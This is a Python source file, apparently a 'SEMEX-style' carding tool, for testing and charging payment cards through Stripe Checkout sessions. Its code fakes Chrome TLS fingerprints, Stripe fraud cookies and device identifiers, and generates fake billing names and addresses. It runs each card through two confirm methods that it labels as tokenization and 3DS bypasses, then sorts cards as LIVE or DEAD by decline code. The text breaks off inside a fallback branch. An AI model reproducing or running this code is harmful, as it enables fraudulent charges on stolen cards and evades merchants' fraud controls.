"""
Stripe Checkout TLS Module — SEMEX-style engine
Real Chrome 124/131/136 TLS fingerprint via curl_cffi
m.stripe.com/6 fraud session | per-card fresh init | Method A+B | 3DS bypass
"""

import asyncio
import random
import string
import time
import re
import json
import base64
import logging
from urllib.parse import unquote, urlencode
from typing import Optional, Dict, Any, List, Tuple

log = logging.getLogger("stripe_tls")

# ── curl_cffi (primary) → tls_client (fallback) ───────────────────────────────
try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
except ImportError:
    CFFI_OK = False
    log.warning("curl_cffi not available — falling back to tls_client")

try:
    import tls_client as _tls_client
    TLS_CLIENT_OK = True
except ImportError:
    TLS_CLIENT_OK = False

try:
    import aiohttp as _aiohttp
    AIOHTTP_OK = True
except ImportError:
    AIOHTTP_OK = False

STRIPE_API = "https://api.stripe.com/v1"

# ── Chrome profiles for curl_cffi impersonation ────────────────────────────────
CFFI_PROFILES = [
    {
        "imp": "chrome136",
        "ua":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "ch":  '"Not/A)Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"',
    },
    {
        "imp": "chrome124",
        "ua":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "ch":  '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
    },
    {
        "imp": "chrome131",
        "ua":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "ch":  '"Not_A Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
    },
]

# Legacy tls_client profiles (fallback)
TLS_BROWSER_PROFILES = ["chrome_120", "chrome_117", "safari_16_0"]

# ── Decline code classification ────────────────────────────────────────────────
LIVE_CODES = {
    "incorrect_cvc", "insufficient_funds", "card_velocity_exceeded",
    "withdrawal_count_limit_exceeded", "new_account_information_available",
    "approve_with_id", "call_issuer", "try_again_later",
    "online_or_telephone_transaction_not_allowed",
}
DEAD_CODES = {
    "do_not_honor", "generic_decline", "fraudulent", "pickup_card",
    "stolen_card", "lost_card", "restricted_card", "security_violation",
    "transaction_not_allowed", "service_not_allowed", "card_not_supported",
    "blocked", "not_permitted", "no_action_taken", "revocation_of_all_authorizations",
}

CURRENCY_SYMBOLS = {
    'usd': '$', 'eur': '€', 'gbp': '£', 'jpy': '¥', 'cny': '¥',
    'inr': '₹', 'krw': '₩', 'rub': '₽', 'brl': 'R$', 'aud': 'A$',
    'cad': 'C$', 'chf': 'CHF', 'hkd': 'HK$', 'sgd': 'S$', 'sek': 'kr',
    'nok': 'kr', 'dkk': 'kr', 'pln': 'zł', 'thb': '฿', 'mxn': 'MX$',
    'idr': 'Rp', 'try': '₺', 'zar': 'R', 'php': '₱', 'myr': 'RM',
    'npr': '₨', 'pkr': '₨', 'lkr': '₨', 'bdt': '৳', 'vnd': '₫',
    'aed': 'د.إ', 'sar': '﷼', 'egp': 'E£', 'ngn': '₦', 'kes': 'KSh',
    'cop': 'COL$', 'ars': 'AR$', 'clp': 'CL$', 'pen': 'S/.', 'uah': '₴',
    'czk': 'Kč', 'huf': 'Ft', 'ron': 'lei', 'bgn': 'лв', 'hrk': 'kn',
    'twd': 'NT$', 'ils': '₪', 'qar': 'QR', 'kwd': 'د.ك', 'bhd': 'BD',
}

# Shared aiohttp session
_aio_session = None

# Last confirm debug
_last_confirm_debug: Dict = {}

# ── Fake billing data pool ─────────────────────────────────────────────────────
_NAMES_FIRST = ["John","James","Michael","David","Robert","Sarah","Jennifer","Emily","Daniel","Chris","Jessica","Matthew","Ashley","Joshua","Amanda"]
_NAMES_LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Taylor","Anderson","Thomas","Jackson","White","Harris"]
_DOMAINS     = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com","proton.me","live.com"]
_ADDRESSES   = [
    {"line1": "476 West White Mountain Blvd", "city": "Pinetop",     "state": "AZ", "postal_code": "85929"},
    {"line1": "123 Main Street",              "city": "New York",    "state": "NY", "postal_code": "10001"},
    {"line1": "456 Oak Avenue",               "city": "Los Angeles", "state": "CA", "postal_code": "90001"},
    {"line1": "789 Pine Road",                "city": "Chicago",     "state": "IL", "postal_code": "60601"},
    {"line1": "321 Elm Street",               "city": "Houston",     "state": "TX", "postal_code": "77001"},
    {"line1": "654 Maple Drive",              "city": "Phoenix",     "state": "AZ", "postal_code": "85001"},
    {"line1": "987 Cedar Lane",               "city": "San Antonio", "state": "TX", "postal_code": "78201"},
]


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def generate_stripe_fingerprint() -> Dict[str, str]:
    chars = string.ascii_lowercase + string.digits
    return {
        "guid":                "".join(random.choices(chars, k=32)),
        "muid":                "".join(random.choices(chars, k=32)),
        "sid":                 "".join(random.choices(chars, k=32)),
        "payment_user_agent":  "stripe.js/7a7dd6d24d; stripe-js-v3/7a7dd6d24d; checkout",
        "time_on_page":        str(random.randint(25000, 180000)),
        "pasted_fields":       "number",
        "referrer":            "https://checkout.stripe.com",
    }

def generate_random_email() -> str:
    name = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 9)))
    return f"{name}{random.randint(10, 99)}@{random.choice(_DOMAINS)}"

def generate_random_name() -> str:
    return f"{random.choice(_NAMES_FIRST)} {random.choice(_NAMES_LAST)}"

def generate_random_phone() -> str:
    return f"+1{''.join(random.choices(string.digits, k=10))}"

def generate_random_address() -> Dict[str, str]:
    a = dict(random.choice(_ADDRESSES))
    a["country"] = "US"
    return a

def _classify(dc: str, msg: str) -> str:
    dc = (dc or "").lower().strip()
    msg_low = (msg or "").lower()
    if dc in LIVE_CODES:                                             return "LIVE"
    if dc in DEAD_CODES:                                             return "DEAD"
    if "incorrect_cvc" in msg_low or "security code" in msg_low:    return "LIVE"
    if "insufficient_funds" in msg_low:                              return "LIVE"
    if "do_not_honor" in msg_low or "fraudulent" in msg_low:        return "DEAD"
    if any(x in msg_low for x in ("stolen", "lost", "pickup")):     return "DEAD"
    return "DECLINED"

def _clean_response(text: str) -> str:
    if not text:
        return ""
    low = text.lower()
    MAP = {
        "incorrect_cvc": "Incorrect CVC", "insufficient_funds": "Insufficient Funds",
        "expired_card": "Card Expired", "card_declined": "Card Declined",
        "do_not_honor": "Do Not Honor", "fraudulent": "Fraudulent",
        "stolen_card": "Stolen Card", "lost_card": "Lost Card",
        "pickup_card": "Pickup Card", "restricted_card": "Restricted Card",
        "generic_decline": "Generic Decline", "card_velocity_exceeded": "Velocity Exceeded",
        "incorrect_zip": "Incorrect ZIP", "processing_error": "Processing Error",
        "security_violation": "Security Violation", "transaction_not_allowed": "Not Allowed",
        "integration surface": "Restricted Key", "tokenization": "Restricted Key",
        "insufficient funds": "Insufficient Funds", "security code": "Incorrect CVC",
    }
    for k, v in MAP.items():
        if k in low:
            return v
    text = re.sub(r'\s*\(https?://[^\)]+\)', '', text)
    text = re.sub(r'https?://\S+', '', text)
    return re.sub(r'\s+', ' ', text).strip()[:80]


def _make_cffi_headers(profile: dict, origin: str = "checkout") -> dict:
    org = "https://js.stripe.com" if origin == "js" else "https://checkout.stripe.com"
    return {
        "accept":           "application/json",
        "accept-encoding":  "gzip, deflate, br",
        "accept-language":  "en-US,en;q=0.9",
        "content-type":     "application/x-www-form-urlencoded",
        "origin":           org,
        "referer":          org + "/",
        "sec-ch-ua":        profile["ch"],
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":   "empty",
        "sec-fetch-mode":   "cors",
        "sec-fetch-site":   "same-site",
        "user-agent":       profile["ua"],
    }

def _make_tls_headers() -> dict:
    return {
        "accept":           "application/json",
        "content-type":     "application/x-www-form-urlencoded",
        "origin":           "https://checkout.stripe.com",
        "referer":          "https://checkout.stripe.com/",
        "user-agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec-ch-ua":        '"Not A(Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":   "empty",
        "sec-fetch-mode":   "cors",
        "sec-fetch-site":   "same-site",
    }

def _proxy_dict(proxy_url: str) -> Optional[dict]:
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


# ══════════════════════════════════════════════════════════════════════════════
#  URL PARSING
# ══════════════════════════════════════════════════════════════════════════════

def decode_pk_from_url(url: str) -> Dict[str, Optional[str]]:
    r: Dict[str, Optional[str]] = {"pk": None, "cs": None}
    try:
        cs = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]+)', url)
        if cs:
            r["cs"] = cs.group(1)
        if '#' in url:
            frag = unquote(url.split('#', 1)[1])
            try:
                xored = ''.join(chr(b ^ 5) for b in base64.b64decode(frag + '=='))
                pk = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]+)', xored)
                if pk:
                    r["pk"] = pk.group(1)
            except Exception:
                pass
        if not r["pk"]:
            pk = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', url)
            if pk:
                r["pk"] = pk.group(1)
    except Exception:
        pass
    return r


# ══════════════════════════════════════════════════════════════════════════════
#  SEMEX CORE — curl_cffi engine
# ══════════════════════════════════════════════════════════════════════════════

def _init_fraud_cookies(proxy_url: str = None) -> dict:
    """
    Hit m.stripe.com/6 twice — exactly what real Chrome does.
    Returns cookies dict to inject into all subsequent requests.
    Falls back to synthetic cookies if curl_cffi unavailable.
    """
    if not CFFI_OK:
        return {
            "__stripe_mid": "".join(random.choices("0123456789abcdef", k=32)),
            "__stripe_sid": "".join(random.choices("0123456789abcdef", k=32)),
        }
    cookies: dict = {}
    proxies = _proxy_dict(proxy_url)
    hdrs = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": CFFI_PROFILES[0]["ua"],
        "Referer": "https://checkout.stripe.com/",
        "Origin": "https://checkout.stripe.com",
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "cross-site",
    }
    try:
        for _ in range(2):
            r = cffi_requests.get(
                "https://m.stripe.com/6",
                headers=hdrs,
                proxies=proxies,
                impersonate="chrome124",
                timeout=6,
            )
            if r.cookies:
                cookies.update(dict(r.cookies))
            time.sleep(random.uniform(0.08, 0.2))
    except Exception:
        pass
    if "__stripe_mid" not in cookies:
        cookies["__stripe_mid"] = "".join(random.choices("0123456789abcdef", k=32))
    if "__stripe_sid" not in cookies:
        cookies["__stripe_sid"] = "".join(random.choices("0123456789abcdef", k=32))
    return cookies


def _fresh_init(pk: str, cs: str, proxy_url: str, cookies: dict, profile: dict) -> Optional[dict]:
    """
    Re-fetch /init to get a fresh init_checksum for each card.
    Eliminates 402 errors from stale checksums.
    """
    if not CFFI_OK:
        return None
    hdrs = _make_cffi_headers(profile)
    body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
    proxies = _proxy_dict(proxy_url)
    for attempt in range(2):
        try:
            r = cffi_requests.post(
                f"{STRIPE_API}/payment_pages/{cs}/init",
                headers=hdrs,
                data=body,
                cookies=cookies,
                proxies=proxies if attempt > 0 else None,
                impersonate=profile["imp"],
                timeout=12,
            )
            data = r.json()
            if "error" not in data:
                return data
        except Exception:
            time.sleep(0.2)
    return None


def _attempt_3ds_bypass(pk: str, pi_id: str, pi_secret: str,
                        proxy_url: str, cookies: dict, profile: dict) -> Optional[dict]:
    """
    Poll the PaymentIntent for 3DS frictionless resolution (4 attempts × 1.5s).
    Returns result dict if resolved, None if still pending after polls.
    """
    if not pi_id or not pi_secret or not CFFI_OK:
        return None
    proxies = _proxy_dict(proxy_url)
    hdrs = _make_cffi_headers(profile)
    for _ in range(4):
        try:
            time.sleep(1.5)
            r = cffi_requests.get(
                f"{STRIPE_API}/payment_intents/{pi_id}?client_secret={pi_secret}&expand[]=payment_method",
                headers=hdrs,
                cookies=cookies,
                proxies=proxies,
                impersonate=profile["imp"],
                timeout=15,
            )
            pi = r.json()
            if "error" in pi:
                break
            status = pi.get("status", "")
            if status == "succeeded":
                return {"status": "CHARGED", "response": "3DS Frictionless — Charged", "decline_code": ""}
            if status == "requires_payment_method":
                lpe = pi.get("last_payment_error") or {}
                dc  = lpe.get("decline_code", "")
                msg = lpe.get("message", "Declined after 3DS")
                return {"status": _classify(dc, msg), "response": _clean_response(msg), "decline_code": dc}
        except Exception:
            pass
    return None


def _is_confirm_error_msg(conf: dict) -> bool:
    if "error" not in conf:
        return False
    msg  = conf["error"].get("message", "").lower()
    code = conf["error"].get("code", "").lower()
    return (
        any(x in msg for x in ["error confirming", "invoice", "doesn't match", "latest invoice"])
        or code in ("amount_too_large", "amount_too_small", "invoice_not_found")
    )


# ══════════════════════════════════════════════════════════════════════════════
#  CHECKOUT INFO
# ══════════════════════════════════════════════════════════════════════════════

def get_checkout_info_sync(url: str, proxy: str = None, max_retries: int = 2) -> Dict[str, Any]:
    """Fetch checkout PK, CS, merchant, amount, mode etc. — curl_cffi primary."""
    result: Dict[str, Any] = {
        "url": url, "pk": None, "cs": None, "merchant": None, "site": None,
        "price": None, "currency": None, "product": None, "country": None,
        "mode": None, "checkout_mode": None, "init_data": None, "error": None,
        "time": 0, "customer_name": None, "customer_email": None,
        "support_email": None, "support_phone": None, "cards_accepted": None,
        "success_url": None, "cancel_url": None,
        "is_trial": False, "trial_period_days": None, "trial_end": None,
        "trial_amount": None, "after_trial_price": None,
        "setup_intent": None, "subscription_data": None, "stripe_account": None,
        "requires_email": False, "requires_name": False, "requires_phone": False,
        "requires_shipping": False, "requires_postal_only": False,
        "requires_full_address": False, "requires_tos": False,
        "billing_mode": "auto", "tokenization_blocked": False,
    }
    start = time.perf_counter()
    url = (url or "").strip()
    if not url or len(url) < 10:
        result["error"] = "No checkout URL provided"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    decoded = decode_pk_from_url(url)
    result["pk"] = decoded.get("pk")
    result["cs"] = decoded.get("cs")

    if not result["cs"]:
        result["error"] = "Could not extract CS from URL"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    proxy_url = proxy if proxy else None
    profile   = random.choice(CFFI_PROFILES) if CFFI_OK else None
    proxies   = _proxy_dict(proxy_url)

    # Fetch PK from page if missing
    if not result["pk"]:
        try:
            if CFFI_OK:
                r = cffi_requests.get(
                    url, headers={"User-Agent": profile["ua"]},
                    proxies=proxies, impersonate=profile["imp"],
                    timeout=15, allow_redirects=True,
                )
                decoded2 = decode_pk_from_url(str(r.url))
                if decoded2["pk"]:
                    result["pk"] = decoded2["pk"]
                if not result["pk"]:
                    pk = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', r.text)
                    if pk:
                        result["pk"] = pk.group(1)
        except Exception:
            pass

    if not result["pk"]:
        result["error"] = "Could not extract PK"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    # /init call
    body     = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
    init_data = None

    for attempt in range(3):
        try:
            if CFFI_OK:
                hdrs = _make_cffi_headers(profile)
                r = cffi_requests.post(
                    f"{STRIPE_API}/payment_pages/{result['cs']}/init",
                    headers=hdrs, data=body,
                    proxies=proxies if attempt > 0 else None,
                    impersonate=profile["imp"], timeout=20,
                )
                init_data = r.json()
            elif TLS_CLIENT_OK:
                session = _tls_client.Session(
                    client_identifier=random.choice(TLS_BROWSER_PROFILES),
                    random_tls_extension_order=True,
                )
                r = session.post(
                    f"{STRIPE_API}/payment_pages/{result['cs']}/init",
                    headers=_make_tls_headers(), data=body,
                )
                init_data = r.json()
            else:
                break

            if "error" not in init_data:
                break
            err_msg = (init_data.get("error") or {}).get("message", "")
            if "expired" in err_msg.lower():
                result["error"] = "SESSION_EXPIRED"
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            init_data = None
        except Exception:
            time.sleep(0.3)

    if not init_data:
        result["error"] = "Init failed"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    result["init_data"] = init_data

    # Parse account / merchant
    acc = init_data.get("account_settings", {})
    result["merchant"] = acc.get("display_name") or acc.get("business_name")
    result["country"]  = acc.get("country")
    result["support_email"] = acc.get("support_email")
    result["support_phone"] = acc.get("support_phone")

    # stripe_account
    acct_direct = init_data.get("stripe_account") or init_data.get("account")
    if acct_direct and str(acct_direct).startswith("acct_"):
        result["stripe_account"] = str(acct_direct)
    else:
        m = re.search(r'"(acct_[A-Za-z0-9]+)"', json.dumps(init_data))
        if m:
            result["stripe_account"] = m.group(1)

    # Pricing
    lig = init_data.get("line_item_group")
    pi  = init_data.get("payment_intent")
    inv = init_data.get("invoice")
    si  = init_data.get("setup_intent")

    if lig:
        result["price"]    = lig.get("total", 0) / 100
        result["currency"] = lig.get("currency", "usd").upper()
        if lig.get("line_items"):
            sym = CURRENCY_SYMBOLS.get(lig.get("currency", "").lower(), "$")
            parts = []
            for item in lig["line_items"]:
                qty  = item.get("quantity", 1)
                name = item.get("name", "Product")
                amt  = item.get("amount", 0) / 100
                iv   = item.get("recurring_interval")
                parts.append(f"{qty}x {name} ({sym}{amt:.2f}" + (f"/{iv}" if iv else "") + ")")
            result["product"] = ", ".join(parts)
    elif pi and isinstance(pi, dict) and pi.get("amount"):
        result["price"]    = pi["amount"] / 100
        result["currency"] = pi.get("currency", "usd").upper()
    elif inv:
        result["price"]    = inv.get("total", 0) / 100
        result["currency"] = inv.get("currency", "usd").upper()
    elif si:
        result["price"]    = 0
        result["currency"] = "USD"

    mode = init_data.get("mode", "")
    result["mode"] = result["checkout_mode"] = mode.upper() if mode else (
        "SUBSCRIPTION" if init_data.get("subscription") else "PAYMENT"
    )

    result["success_url"] = (
        init_data.get("success_url")
        or (init_data.get("after_payment_confirmation_params") or {}).get("success_url")
        or init_data.get("return_url")
    )
    result["cancel_url"] = init_data.get("cancel_url")

    # Site
    from urllib.parse import urlparse
    for uk in ("success_url", "cancel_url"):
        t = init_data.get(uk)
        if t and "stripe.com" not in t.lower():
            result["site"] = urlparse(t).netloc
            break

    # Customer
    cust = init_data.get("customer") or {}
    result["customer_name"]  = cust.get("name")
    result["customer_email"] = init_data.get("customer_email") or cust.get("email")

    # Payment method types
    pm_types = init_data.get("payment_method_types") or []
    if pm_types:
        pts = [t.upper() for t in pm_types]
        result["cards_accepted"] = ", ".join(pts)

    # Checkout options
    co = init_data.get("checkout_options", {})
    billing_coll = co.get("billing_address_collection", "auto")
    result["billing_mode"]         = billing_coll
    result["requires_full_address"]= (billing_coll == "required")
    result["requires_postal_only"] = (billing_coll == "auto")
    phone_coll = co.get("phone_number_collection", {})
    result["requires_phone"]   = phone_coll.get("enabled", False)
    ship_coll = co.get("shipping_address_collection", {})
    result["requires_shipping"]= bool(ship_coll and ship_coll.get("allowed_countries"))
    consent = co.get("consent_collection") or init_data.get("consent_collection") or {}
    result["requires_tos"] = (consent.get("terms_of_service", "") == "required")
    result["requires_email"] = not result["customer_email"]

    # Trial / setup
    if si:
        result["setup_intent"] = si.get("id") if isinstance(si, dict) else si
    sub = init_data.get("subscription") or init_data.get("subscription_data") or {}
    if isinstance(sub, dict):
        trial_end  = sub.get("trial_end")
        trial_days = sub.get("trial_period_days")
        if trial_end or trial_days:
            result["is_trial"]          = True
            result["trial_period_days"] = trial_days
            result["trial_end"]         = trial_end
        result["subscription_data"] = sub
    if not result["is_trial"] and mode == "setup":
        result["is_trial"] = True
        result["mode"]     = "SETUP (TRIAL)"
    if not result["is_trial"] and result.get("price") == 0 and (
        mode != "payment" or init_data.get("subscription")
    ):
        result["is_trial"] = True

    result["time"] = round(time.perf_counter() - start, 2)
    return result


# ══════════════════════════════════════════════════════════════════════════════
#  CHARGE CARD — SEMEX full flow (curl_cffi primary)
# ══════════════════════════════════════════════════════════════════════════════

def charge_card_sync(
    card: Dict[str, str],
    checkout_data: Dict[str, Any],
    proxy: str = None,
    custom_email: str = None,
    custom_name: str = None,
    max_retries: int = 2
) -> Dict[str, Any]:
    """
    Full SEMEX hit flow:
    1. Init fraud cookies (m.stripe.com/6)
    2. Per-card fresh init_checksum
    3. Method A: Create PaymentMethod → Confirm
    4. Method B: Direct embedded card confirm (tokenization bypass)
    5. 3DS frictionless bypass (polling)
    Falls back to tls_client if curl_cffi unavailable.
    """
    global _last_confirm_debug
    start = time.perf_counter()
    cc_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    result: Dict[str, Any] = {
        "card": cc_str, "status": "FAILED", "response": "",
        "decline_code": "N/A", "time": 0, "success_url": None,
    }

    pk      = checkout_data.get("pk")
    cs      = checkout_data.get("cs")
    init_d  = checkout_data.get("init_data")
    mode    = checkout_data.get("checkout_mode") or (init_d or {}).get("mode", "payment")

    if not pk or not cs or not init_d:
        result["response"] = "Missing PK/CS/init"
        result["time"]     = round(time.perf_counter() - start, 2)
        return result

    proxy_url = proxy if proxy else None

    # ── curl_cffi path ─────────────────────────────────────────────────────────
    if CFFI_OK:
        profile  = random.choice(CFFI_PROFILES)
        proxies  = _proxy_dict(proxy_url)
        imp      = profile["imp"]

        # Step 1 — fraud cookies
        cookies  = _init_fraud_cookies(proxy_url)

        # Step 2 — per-card fresh init
        fresh = _fresh_init(pk, cs, proxy_url, cookies, profile)
        if fresh and "error" not in fresh:
            init_d = fresh

        # Billing
        billing = {
            "email": custom_email or checkout_data.get("customer_email") or init_d.get("customer_email") or generate_random_email(),
            "name":  custom_name  or checkout_data.get("customer_name")  or (init_d.get("customer") or {}).get("name") or generate_random_name(),
            "addr":  generate_random_address(),
        }

        # Amounts
        lig      = init_d.get("line_item_group")
        pi_d     = init_d.get("payment_intent")
        inv      = init_d.get("invoice")
        total, subtotal = 0, 0
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif pi_d and isinstance(pi_d, dict) and pi_d.get("amount"):
            total = subtotal = pi_d["amount"]
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)

        checksum = init_d.get("init_checksum", "")
        fp       = generate_stripe_fingerprint()
        hdrs     = _make_cffi_headers(profile)
        hdrs_js  = _make_cffi_headers(profile, origin="js")

        # ── Method A: Create PaymentMethod ────────────────────────────────────
        pm_id = None
        try:
            addr = billing["addr"]
            pm_data = {
                "type": "card",
                "card[number]":   card["cc"],
                "card[cvc]":      card["cvv"],
                "card[exp_month]":card["month"],
                "card[exp_year]": card["year"],
                "guid": fp["guid"], "muid": fp["muid"], "sid": fp["sid"],
                "pasted_fields":       fp["pasted_fields"],
                "payment_user_agent":  fp["payment_user_agent"],
                "time_on_page":        fp["time_on_page"],
                "referrer":            "https://checkout.stripe.com",
                "key": pk,
                "billing_details[name]":                   billing["name"],
                "billing_details[email]":                  billing["email"],
                "billing_details[address][country]":       addr["country"],
                "billing_details[address][postal_code]":   addr["postal_code"],
                "billing_details[address][line1]":         addr["line1"],
                "billing_details[address][city]":          addr["city"],
                "billing_details[address][state]":         addr["state"],
            }
            r = cffi_requests.post(
                f"{STRIPE_API}/payment_methods",
                headers=hdrs_js, data=urlencode(pm_data),
                cookies=cookies, proxies=proxies,
                impersonate=imp, timeout=20,
            )
            pm = r.json()
            if "error" not in pm:
                pm_id = pm.get("id")
        except Exception as e:
            log.debug("Method A PM creation error: %s", e)

        def _build_confirm(pm_payload: Any, is_direct: bool = False) -> dict:
            addr = billing["addr"]
            conf: Dict[str, Any] = {
                "eid": "NA",
                "expected_payment_method_type": "card",
                "key": pk,
                "init_checksum": checksum,
                "return_url": "https://checkout.stripe.com",
                "consent[terms_of_service]": "accepted",
            }
            if is_direct:
                conf.update({
                    "payment_method_data[type]":                        "card",
                    "payment_method_data[card][number]":                card["cc"],
                    "payment_method_data[card][cvc]":                   card["cvv"],
                    "payment_method_data[card][exp_month]":             card["month"],
                    "payment_method_data[card][exp_year]":              card["year"],
                    "payment_method_data[guid]":                        fp["guid"],
                    "payment_method_data[muid]":                        fp["muid"],
                    "payment_method_data[sid]":                         fp["sid"],
                    "payment_method_data[pasted_fields]":               fp["pasted_fields"],
                    "payment_method_data[payment_user_agent]":          fp["payment_user_agent"],
                    "payment_method_data[billing_details][name]":       billing["name"],
                    "payment_method_data[billing_details][email]":      billing["email"],
                    "payment_method_data[billing_details][address][country]":     addr["country"],
                    "payment_method_data[billing_details][address][postal_code]": addr["postal_code"],
                    "payment_method_data[billing_details][address][line1]":       addr["line1"],
                    "payment_method_data[billing_details][address][city]":        addr["city"],
                    "payment_method_data[billing_details][address][state]":       addr["state"],
                })
            else:
                conf["payment_method"] = pm_payload

            if mode == "setup":
                conf["expected_amount"] = 0
            else:
                conf["expected_amount"] = total
                conf["last_displayed_line_item_group_details[subtotal]"]               = subtotal
                conf["last_displayed_line_item_group_details[total_exclusive_tax]"]    = 0
                conf["last_displayed_line_item_group_details[total_inclusive_tax]"]    = 0
                conf["last_displayed_line_item_group_details[total_discount_amount]"]  = 0
                conf["last_displayed_line_item_group_details[shipping_rate_amount]"]   = 0
            return conf

        def _do_confirm(conf: dict) -> Optional[dict]:
            try:
                r = cffi_requests.post(
                    f"{STRIPE_API}/payment_pages/{cs}/confirm",
                    headers=hdrs, data=urlencode(conf),
                    cookies=cookies, proxies=proxies,
                    impersonate=imp, timeout=30,
                )
                return r.json()
            except Exception:
                return None

        def _retry_confirm(conf: dict) -> Optional[dict]:
            c1 = {k: v for k, v in conf.items() if k != "consent[terms_of_service]"}
            r1 = _do_confirm(c1)
            if r1 and not _is_confirm_error_msg(r1):
                return r1
            c2 = {k: v for k, v in conf.items() if not k.startswith("last_displayed")}
            c2["expected_amount"] = 0
            r2 = _do_confirm(c2)
            if r2 and not _is_confirm_error_msg(r2):
                return r2
            return r1

        def _parse(conf_result: Optional[dict]) -> dict:
            if not conf_result:
                result["response"] = "No response"
                result["time"]     = round(time.perf_counter() - start, 2)
                return result

            if "error" in conf_result:
                _last_confirm_debug.update(conf_result)
                err     = conf_result["error"]
                msg     = err.get("message", "")
                dc      = err.get("decline_code", "") or err.get("code", "")
                msg_low = msg.lower()

                if "integration surface" in msg_low or "tokenization" in msg_low:
                    result["status"]   = "NOT SUPPORTED"
                    result["response"] = "Tokenization blocked"
                elif "no longer active" in msg_low or ("expired" in msg_low and "card" not in msg_low):
                    result["status"]   = "EXPIRED"
                    result["response"] = "Session expired"
                elif dc == "expired_card" or "card has expired" in msg_low:
                    result["status"]       = "EXPIRED"
                    result["response"]     = "Card expired"
                    result["decline_code"] = dc
                else:
                    status = _classify(dc, msg)
                    result["status"]       = status
                    result["response"]     = f"[{dc}] {_clean_response(msg)}" if dc else _clean_response(msg)
                    result["decline_code"] = dc or "N/A"
                result["time"] = round(time.perf_counter() - start, 2)
                return result

            # 3DS check
            pi_obj = conf_result.get("payment_intent") or {}
            if isinstance(pi_obj, dict):
                next_action = pi_obj.get("next_action") or {}
                action_type = next_action.get("type", "")
                pi_id       = pi_obj.get("id")
                pi_secret   = pi_obj.get("client_secret")

                if action_type == "use_stripe_sdk" and pi_id and pi_secret:
                    bypass = _attempt_3ds_bypass(pk, pi_id, pi_secret, proxy_url, cookies, profile)
                    if bypass:
                        result.update(bypass)
                        result["time"] = round(time.perf_counter() - start, 2)
                        return result
                    result["status"]        = "3DS"
                    result["response"]      = "3DS Required"
                    result["pi_id"]         = pi_id
                    result["pi_client_secret"] = pi_secret
                    result["time"]          = round(time.perf_counter() - start, 2)
                    return result

                if action_type == "redirect_to_url":
                    result["status"]   = "3DS"
                    result["response"] = "3DS Redirect Challenge"
                    result["time"]     = round(time.perf_counter() - start, 2)
                    return result

                pi_status = pi_obj.get("status", "")
                if pi_status in ("succeeded", "processing", "requires_capture"):
                    price  = checkout_data.get("price")
                    cur    = (checkout_data.get("currency") or "").upper()
                    result["status"]      = "CHARGED"
                    result["response"]    = f"Charged {cur} {price}" if price else "Payment Successful"
                    result["success_url"] = conf_result.get("success_url") or checkout_data.get("success_url")
                    result["time"]        = round(time.perf_counter() - start, 2)
                    return result

            # Setup intent
            si_obj = conf_result.get("setup_intent") or {}
            if isinstance(si_obj, dict) and si_obj.get("status") == "succeeded":
                result["status"]   = "CHARGED"
                result["response"] = "Setup succeeded"
                result["time"]     = round(time.perf_counter() - start, 2)
                return result

            # Success URL redirect
            if conf_result.get("success_url") or conf_result.get("redirect_to_url"):
                result["status"]   = "CHARGED"
                result["response"] = "Payment Successful"
                result["time"]     = round(time.perf_counter() - start, 2)
                return result

            result["status"]   = "FAILED"
            result["response"] = "Unknown response"
            result["time"]     = round(time.perf_counter() - start, 2)
            return result

        # ── Run Method A ───────────────────────────────────────────────────────
        conf_result = None
        if pm_id:
            conf = _build_confirm(pm_id)
            conf_result = _do_confirm(conf)
            if conf_result and _is_confirm_error_msg(conf_result):
                conf_result = _retry_confirm(conf)

        # ── Run Method B (direct embed) if Method A failed / blocked ──────────
        if not conf_result or pm_id is None:
            conf = _build_confirm(None, is_direct=True)
            conf_result = _do_confirm(conf)
            if conf_result and _is_confirm_error_msg(conf_result):
                conf_result = _retry_confirm(conf)

        return _parse(conf_result)

    # ── tls_client fallback ────────────────────────────────────────────────────
    if not TLS_CLIENT_OK:
        result["status"]   = "ERROR"
        result["response"] = "No HTTP engine available"
        result["time"]     = round(time.perf_counter() - start, 2)
        return result

    billing = {
        "email": custom_email or generate_random_email(),
        "name":  custom_name  or generate_random_name(),
        "addr":  generate_random_address(),
    }
    lig = init_d.get("line_item_group")
    inv = init_d.get("invoice")
